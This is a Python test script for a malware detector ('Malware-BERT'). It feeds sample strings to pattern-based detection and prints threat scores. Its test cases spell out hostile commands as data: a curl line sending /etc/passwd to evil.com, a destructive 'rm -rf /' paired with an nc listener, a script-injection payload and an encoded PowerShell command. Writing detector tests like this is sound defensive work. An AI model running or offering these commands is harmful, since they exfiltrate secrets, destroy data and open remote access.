#!/usr/bin/env python3
"""
Test script for Malware-BERT detection
"""

from malware_bert import MalwareBERTDetector

def test_detection():
    print("Malware-BERT Detection Test")
    print("=" * 40)
    
    # Initialize detector
    detector = MalwareBERTDetector()
    print(f"ML Available: {detector.ml_available}")
    print()
    
    # Test cases
    test_cases = [
        ("Hello world, this is a normal message", "Clean message"),
        ("curl https://evil.com --data \"$(cat /etc/passwd)\"", "Malicious curl command"),
        ("rm -rf / && while true; do nc -l 4444; done", "Destructive shell command"),
        ("<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>", "Script injection"),
        ("powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAA7AA==", "Encoded PowerShell"),
        ("https://bit.ly/suspicious-link", "Suspicious URL"),
        ("192.168.1.100:8080/api", "IP address URL"),
        ("base64 encoded: SGVsbG8gV29ybGQ=", "Base64 encoded data"),
    ]
    
    for i, (text, description) in enumerate(test_cases, 1):
        print(f"Test {i}: {description}")
        print(f"Text: {text[:60]}{'...' if len(text) > 60 else ''}")
        
        # Test pattern-based detection
        result = detector.detect_malware(text, use_ml=False)
        
        print(f"Threat Level: {result.threat_level.value}")
        print(f"Confidence: {result.confidence:.2f}")
        print(f"Risk Score: {result.risk_score:.2f}")
        
        if result.indicators:
            print(f"Indicators: {', '.join(result.indicators)}")
        
        if result.patterns_found:
            print(f"Patterns Found: {len(result.patterns_found)}")
            for pattern in result.patterns_found[:3]:  # Show first 3 patterns
                print(f"  - {pattern}")
        
        print("-" * 40)

if __name__ == "__main__":
    test_detection()
